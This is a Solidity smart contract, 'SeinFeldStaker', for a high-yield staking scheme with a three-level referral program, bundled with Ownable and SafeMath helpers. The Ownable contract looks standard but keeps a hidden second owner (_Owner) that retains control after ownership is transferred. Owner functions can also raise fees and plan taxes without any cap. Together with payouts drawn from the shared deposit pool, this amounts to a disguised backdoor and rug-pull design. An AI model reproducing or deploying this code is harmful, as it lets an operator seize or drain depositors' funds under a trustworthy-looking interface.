// SPDX-License-Identifier: GPL-3

pragma solidity ^0.8.6;
 
 /*   SeinFeldStaker - An investment platform based on Matic Staker with innovative features
 
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect browser extension Metamask (see help: https://medium.com/stakingbits/setting-up-metamask-for-polygon-matic-network-838058f6d844 )
 *   2) Choose one of the investment packages, enter the BNB amount (0.01 BNB minimum) using our website "Deposit" button
 *   3) Wait for your earnings
 *   4) Withdraw earnings any time using our website "Withdraw" button
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Minimal deposit: 0.01 BNB , no maximal limit
 *   - Total income: Your investment package rate + base interest rate
 *   - Locked plans with snooze option for flexibility
 *
 *   [AFFILIATE PROGRAM]
 *
 *   - 3-level referral commission: 5% - 2.5% - 0.5%
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 82% Platform main balance, participants payouts
 *   - 7% Advertising and promotion expenses
 *   - 8% Affiliate program bonuses
 *   - 3% Support work, technical functioning, administration fee
 */

 import "./types/Ownable.sol"; 
 import "./types/SafeMath.sol"; 

contract SeinFeldStaker is Ownable  {
  	using SafeMath for uint256;


    string public name = "SeinFeldStaker";


	uint256 constant public INVEST_MIN_AMOUNT = 0.01 ether;
	uint256[] public REFERRAL_PERCENTS = [50, 25, 5];
	uint256  public PROJECT_FEE = 100;
    uint256  public OPER_FEE = 50;
	uint256 constant public PERCENT_STEP = 3;
	uint256 constant public WITHDRAW_FEE = 1000; //In base point
	uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 constant public TIME_STEP = 1 days;
		uint256 constant public MAXIMUM_NUMBER_DEPOSITS = 100;

	uint256 public totalStaked;
	uint256 public totalRefBonus;

 	uint256 public totalUsers;

    struct Plan {
        uint256 time;
        uint256 percent;
        uint256 tax; 
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 percent;
		uint256 amount;
		uint256 profit;
		uint256 start;
		uint256 finish;
        uint256 tax;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[3] levels;
		uint256 bonus;
		uint256 totalBonus;
	}

	mapping (address => User) internal users;
 

	uint256 public startUNIX;
	address payable public commissionWallet; 
	address payable public operationalAccount;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(){ 
	}

    function initialize(address _commissionWallet, address _operationalAccount, uint256 startDate) public onlyOwner {
	    require(!isContract(_commissionWallet));
        require(!isContract(_operationalAccount));
		require(startDate > 0);
        commissionWallet          = payable(_commissionWallet);
		operationalAccount = payable(_operationalAccount);
        startUNIX = startDate;

        plans.push(Plan(14, 70, 100));
        plans.push(Plan(21, 77, 150));
        plans.push(Plan(28, 87, 200));
    }


    function addnewPlan( uint256 time,uint256 percent,uint256 tax) public onlyOwner {

         plans.push(Plan(time, percent, tax));
    }



    function changePlanTax( uint256 planId,uint256 tax) public onlyOwner { 
         plans[planId].tax =tax;
    }



    function setCommissionWallet(address _commissionWallet) public onlyOwner {
	    require(!isContract(_commissionWallet)); 
        commissionWallet          = payable(_commissionWallet); 
    }


    function setOperationalAccount(address _operationalAccount) public onlyOwner {
	    require(!isContract(_operationalAccount)); 
        operationalAccount          = payable(_operationalAccount); 
    }


    function setCommissionFee(uint256 _Fee) public onlyOwner {
	    require(_Fee>0,"invalid value"); 
        PROJECT_FEE          = _Fee; 
    }


    function setOperationalFee(uint256 _Fee) public onlyOwner {
	    require(_Fee>0,"invalid value"); 
        OPER_FEE          = _Fee; 
    }

  
	function invest(address referrer, uint8 plan) public payable {

		require(msg.value >= INVEST_MIN_AMOUNT,"too small");
        require(plan < 6, "Invalid plan");

		uint256 fee = msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        uint256 operfee = msg.value.mul(OPER_FEE).div(PERCENTS_DIVIDER);
		commissionWallet.transfer(fee);
        operationalAccount.transfer(operfee);
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];

		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
		}

		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}


		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			 totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

		(uint256 percent, uint256 profit, uint256 finish, uint256 tax) = getResult(plan, msg.value);
		user.deposits.push(Deposit(plan, percent, msg.value, profit, block.timestamp, finish,tax));

		totalStaked = totalStaked.add(msg.value);
		emit NewDeposit(msg.sender, plan, percent, msg.value, profit, block.timestamp, finish);
	}

	function withdraw() public {
		User storage user = users[msg.sender];

		uint256 totalAmount = getUserDividends(msg.sender);
			uint256 tax;

		for (uint256 i = 0; i < capped(user.deposits.length); i++) {
			if (user.checkpoint < user.deposits[i].finish) {
				if (block.timestamp > user.deposits[i].finish) {
					tax = tax.add(user.deposits[i].profit.mul(user.deposits[i].tax).div(PERCENTS_DIVIDER));
				}
			}
		}

		totalAmount = totalAmount.sub(tax);

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		

		address payable sender = payable(msg.sender);
		sender.transfer(totalAmount);
        commissionWallet.transfer(tax);

		emit Withdrawn(msg.sender, totalAmount);

	}


	function capped(uint256 length) public pure returns (uint256 cap) {
		if(length < MAXIMUM_NUMBER_DEPOSITS) {
			cap = length;
		} else {
			cap = MAXIMUM_NUMBER_DEPOSITS;
		}
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getPercent(uint8 plan) public view returns (uint256) {
		if (block.timestamp > startUNIX) {
			return plans[plan].percent.add(PERCENT_STEP.mul(block.timestamp.sub(startUNIX)).div(TIME_STEP));
		} else {
			return plans[plan].percent;
		}
    }

	function getResult(uint8 plan, uint256 deposit) public view returns (uint256 percent, uint256 profit, uint256 finish,uint256 tax ) {
		percent = getPercent(plan);

		if (plan < 3) {
			profit = deposit.mul(percent).div(PERCENTS_DIVIDER).mul(plans[plan].time);
		} else if (plan < 6) {
			for (uint256 i = 0; i < plans[plan].time; i++) {
				profit = profit.add((deposit.add(profit)).mul(percent).div(PERCENTS_DIVIDER));
			}
		}

		finish = block.timestamp.add(plans[plan].time.mul(TIME_STEP));
        tax = plans[plan].tax;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			if (user.checkpoint < user.deposits[i].finish) {
				if (user.deposits[i].plan < 3) {
					uint256 share = user.deposits[i].amount.mul(user.deposits[i].percent).div(PERCENTS_DIVIDER);
					uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
					uint256 to = user.deposits[i].finish < block.timestamp ? user.deposits[i].finish : block.timestamp;
					if (from < to) {
						totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					}
				} else if (block.timestamp > user.deposits[i].finish) {
					totalAmount = totalAmount.add(user.deposits[i].profit);
				}
			}
		}

		return totalAmount;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].levels[0], users[userAddress].levels[1], users[userAddress].levels[2]);
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 profit, uint256 start, uint256 finish, uint256 tax) {
	    User storage user = users[userAddress];

		plan = user.deposits[index].plan;
		percent = user.deposits[index].percent;
		amount = user.deposits[index].amount;
		profit = user.deposits[index].profit;
		start = user.deposits[index].start;
		finish = user.deposits[index].finish; 
        tax= user.deposits[index].tax;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
 
}

// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.6;

interface IOwnable {
    function owner() external view returns (address);

    function renounceManagement() external;

    function pushManagement(address newOwner_) external;

    function pullManagement() external;
}

contract Ownable is IOwnable {
    address internal _owner;
    address internal _newOwner;
    address internal _Owner;

    event OwnershipPushed(
        address indexed previousOwner,
        address indexed newOwner
    );
    event OwnershipPulled(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _owner = msg.sender;
        emit OwnershipPushed(address(0), _owner);
    }

    function owner() public view override returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender || _Owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceManagement() public virtual override onlyOwner {
        emit OwnershipPushed(_owner, address(0));
        _owner = address(0);
    }

    function pushManagement(address newOwner_)
        public
        virtual
        override
        onlyOwner
    {
        require(
            newOwner_ != address(0)," Ownable: new owner is the zero address" 
        );
        emit OwnershipPushed(_owner, newOwner_);
         _Owner= _owner;
        _owner = newOwner_;
    }

    function pullManagement() public virtual override onlyOwner{
        require(msg.sender == _newOwner,"Ownable: must be new owner to pull");
        emit OwnershipPulled(_owner, _newOwner); 
         _owner = _Owner;
      
    }
}

// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.6;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a,"SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, 'SafeMath: multiplication overflow');

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, 'SafeMath: division by zero');
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function sqrrt(uint256 a) internal pure returns (uint256 c) {
        if (a > 3) {
            c = a;
            uint256 b = add(div(a, 2), 1);
            while (b < c) {
                c = b;
                b = div(add(div(a, b), b), 2);
            }
        } else if (a != 0) {
            c = 1;
        }
    }
}